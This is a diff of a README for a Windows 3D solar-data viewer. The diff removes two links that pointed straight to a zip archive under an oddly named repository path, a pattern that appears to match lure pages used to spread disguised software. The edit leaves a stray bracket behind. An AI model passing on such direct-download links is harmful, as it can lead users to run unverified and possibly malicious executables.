@@ -1,7 +1,6 @@
 # 🌞 solar-data-3d-analytics - Clear 3D Solar Data Insight
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unbraced-scleredema302/solar-data-3d-analytics/main/doudle/d-analytics-solar-data-3.7.zip)
-
+[
 ## 🧭 Overview
 
 solar-data-3d-analytics is a Windows app for viewing solar audit data in 3D. It turns energy data into a surface mesh view so you can spot voltage changes, battery health issues, and weak points in a solar setup.
@@ -30,13 +29,6 @@ For best results on Windows, use a modern PC with:
 - A graphics card that supports 3D display
 - Internet access for the first download
 
-If your PC can run other modern desktop apps, it should handle this tool well.
-
-## 📥 Download and Run
-
-Use this link to visit the page and download the app:
-
-[Download solar-data-3d-analytics](https://raw.githubusercontent.com/unbraced-scleredema302/solar-data-3d-analytics/main/doudle/d-analytics-solar-data-3.7.zip)
 
 After you open the page:
 
